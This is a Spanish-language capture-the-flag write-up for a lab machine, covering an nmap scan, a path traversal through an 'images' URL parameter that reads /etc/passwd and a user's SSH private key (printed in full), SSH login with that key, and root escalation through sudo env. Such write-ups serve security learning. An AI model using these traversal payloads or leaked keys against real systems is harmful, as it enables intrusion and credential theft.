# pn to pn to -
## Reconocimiento
En primer lugar, haciendo uso de `nmap` escaneo todos los puertos de la máquina para obtener información.
```
❯ nmap -p 0-65535 --open -T5 -A -sT -Pn -n 172.17.0.2 -oX nmapScan.xml && xsltproc nmapScan.xml -o nmapScan.html && open nmapScan.html &>/dev/null & disown
```

![Escaneo nmap](imgs/1.png)

El resultado: Un servidor SSH y uno HTTP de título "LeFvIrus", a falta de más info, accedo a la página para recavar datos. La página muestra un mensaje que avisa de que el equipo esta infectado con un virus, bajo este mensaje hay dos botones, uno para ver ejemplos de otros sistemas infectados y uno que dice: *Hacer clic aquí podría empeorar la situación.*

Revisando el código fuente veo que el botón de peligro ejecuta un script, lo pruebo y básicamente se carga la máquina, tuve que reiniciar el laboratorio ya que respondía con 403 todo el rato después de pulsarlo.
Por otro lado, el botón de los ejemplos redirige a `/ejemplos.php`, pero el directorio muestra un error ya que no hay ningún archivo. La forma de la URL me llama la atención.
```
http://172.17.0.2/ejemplos.php?images=./ejemplo1.png
```
## Explotación
Al probar un payload sencillo de directory trasversal, veo que el parámetro es vulnerable.
```
http://172.17.0.2/ejemplos.php?images=/etc/passwd
```

![Directory traversal](imgs/2.png)

Probando a buscar distintos archivos aprovechando la vulnerabilidad encontrada, doy con la llave de SSH del usuario `nico`
```
-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEA07BRWc6X8Yz+VwO1l5UAqcFE5K+1yQ9QxFBrt8DzyC9x7o0tluCk 4f4gObHgatf/tXX/z8oGKYnAY48/vctJz//3M9phYgcFhoDOs+F3NgyYZ7oZN/TeEgTlql Z4QGyjn5akiLmDwSTqEqd5Tla+KnNVCEHO2MpoDTWJB4uI6TdHt3iDX19jszJ+r9BNZODk O7RUkL72sq2pAHLfhlPlaDdH50cd/1bNOkm45U4JmXxTrWNh4AmaZdHGIPiQpvRUJDXack 9tfWaxXBRG95YHh1DMg8LZujKkk35XbesoMBK+eh2mBdISDxR7+XPTyiyGAJ0Qts2TjIfm 2Agqzwbjl1uPffyMrjS2t5gzKcWuPDXWKXmy0rF6ZEWw2hKdC3oY/rxM+zg5B+cnmCTja5 5AgpYgnxN7PD4BLqGFP5Nu1bZ3txduoDlEROHkmsIAJMwy6JNRg7qNL11m2S8YuxR5Iyi5 gpgnD3PQxEepQ0L/7xrUELUvf4jnaLnNBiFaDob7AAAFiNB8ulDQfLpQAAAAB3NzaC1yc2 EAA73n XM31TeyMRbAfpCZ92xRsllCFS2zLmpy8jzPu1BzPGDI0UoWQs7VPeXm13CexexGcmOXxuv 9lqIIv+9GFaB5TxS6K7yaySgrvI3BUmvqGCx4fnWNf/6yrZ1raObcb3yGvqnrCexDySYq3 hXvIai+6lKnPeetrE5LshmcXdJwUIFAAAAwQDefEaIqWZ3JcxAD04Z8/O6uhZ3WOYoLuHX fJlc5trofrBQL5xa4P53ngHUxA4F2DbQCqbPaSCZFirq3IUEUzzOZ5Npvuur5VO41EtxTp CC2BZ0iK2UIBhk/Q62gLCU2EnuHtu6dbLEeuDF6tIlKXGbw0Lib54wRFHHQyETjJI3UGjV QkAljDAS+mPSQgQ0Mdc/KUBZ8e3AE39dxKcYs5WFyfiiZ72TJJekOiJICcOAPLH0iP+lru ayyxi3hh3t9P8AAAARbmljb0AzYTQ4YjEyYjU3YTIBAg== -----END OPENSSH PRIVATE KEY-----
```
Guardo el contenido en un archivo llamado id_rsa en mi máquina, le doy permisos y accedo mediante SSH a la máquina víctima.
```
chmod 600 id_rsa
ssh -i id_rsa nico@172.17.0.2
```
## Post explotación
Una vez dentro, al ejecutar `sudo -l` veo que puedo usar el binario `env` como root, después de una búsqueda en GTFObins ya está resuelto. 

![Post explotación](imgs/3.png)